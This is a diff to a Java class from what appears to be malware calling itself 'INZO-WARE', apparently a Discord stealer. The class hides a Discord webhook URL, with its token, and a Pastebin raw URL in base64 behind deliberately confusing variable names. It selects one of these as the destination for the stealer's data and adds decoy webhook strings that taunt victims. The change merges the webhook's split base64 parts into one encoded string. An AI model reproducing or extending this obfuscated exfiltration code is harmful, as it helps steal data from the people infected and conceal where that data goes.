@@ -18,32 +18,14 @@ public class Hooks374 {
 	
 	public static ArrayList<String> realHooks = new ArrayList<>();
 	public static ArrayList<String> INZOWEBHOOK = new ArrayList<String>();
-	
+	public static String lIIlIlIll = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTI2OTE3NTc2NDI3MTk2NDY2L3pSNl9veVZJNXdOVldBdHNSZ1FMSWNwRTE0a2hSUnA5MmxSV3JucHJET0lTZlZoaTAxTFp6U1Y2R3RQNXlSS2dVT3Bn"; // discord webhoook url encoded in base64
+	public static String IIllIlIll = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0RVYjBIM3R1"; // pastebin url encoded in base64
+
 	public static String getyou() {
 
-		Base64.Decoder dec = Base64.getDecoder();
-		String lIllIlIll = "UldybnByRE9JU2ZWaGkwMUxaeg=="; // part 6 of the webhook encoded in base64 (the id)
-	    String lIIIllIII = "MTk2NDY2"; // part 3 of the webhook encoded in base64 (the id)
-		String IIllIlIll = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0RVYjBIM3R1"; // pastebin url encoded in base64
-		String IlIIlIIIl = "elI2X295Vkk1d05WV0F0cw=="; // part 4 of the webhook encoded in base64 (the token)
-		String IllIlllIl = "OTI2OTE="; // part 1 of the webhook encoded in base64 (the id)
-		String llIIlIlII = "UmdRTEljcEUxNGtoUlJwOTJs"; // part 5 of the webhook encoded in base64 (the token)
-		String llIlllIII = "U1Y2R3RQNXlSS2dVT3Bn"; // part 7 of the webhook encoded in base64 (the token)
-		String lIIIllIIl = "NzU3NjQyNw=="; // part 2 of the webhook encoded in base64 (the id)
-		String lIIlIlIll = "ZGlzY29yZC5jb20=";
-		String lIIIIlIll = "YXBp";
-		String lIIIIlIlI = "d2ViaG9va3M=";
+		Base64.Decoder dec = Base64.getDecoder(); 
 		String IIllIlIlI = new String(dec.decode(IIllIlIll));
-		String IIIIlIIIl = new String(dec.decode(lIIIIlIlI));
-		String IIllIlIII = new String(dec.decode(lIllIlIll));
-		String lIIlIlIII = new String(dec.decode(lIIIllIII));
-		String lIIlIlIlI = new String(dec.decode(IlIIlIIIl));
-		String lIlIllIIl = new String(dec.decode(lIIIllIIl));
 		String IllIlIlIl = new String(dec.decode(lIIlIlIll));
-		String IllIlIIIl = new String(dec.decode(lIIIIlIll));
-		String IIlIlllIl = new String(dec.decode(IllIlllIl));
-		String llIIIIlII = new String(dec.decode(llIIlIlII));
-		String llIlllIlI = new String(dec.decode(llIlllIII));
 
 		if(IIllIlIlI != "") {
 			if(IIllIlIlI.contains("pastebin") && IIllIlIlI.contains("raw")) {
@@ -68,15 +50,15 @@ public class Hooks374 {
 				
 			}
 		}else {
-			INZOWEBHOOK.add("https://" + IllIlIlIl + "/" + IllIlIIIl + "/" + IIIIlIIIl + "/" + IIlIlllIl + lIlIllIIl + lIIlIlIII +"/" + lIIlIlIlI + llIIIIlII + IIllIlIII + llIlllIlI);
+			INZOWEBHOOK.add(IllIlIlIl);
 		}
 		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVE-BEEN-INFECTED");
 		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/INJECTION-COMPLETED");
 		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVENT-OF-TRIED-TO-DECOMPILE-THIS");
 		Random r = new Random();
 		int picked = r.nextInt(INZOWEBHOOK.size());
-		String dupedItem = INZOWEBHOOK.get(picked);
-		return dupedItem;
+		String InzoItem = INZOWEBHOOK.get(picked);
+		return InzoItem;
 	}
 
 }
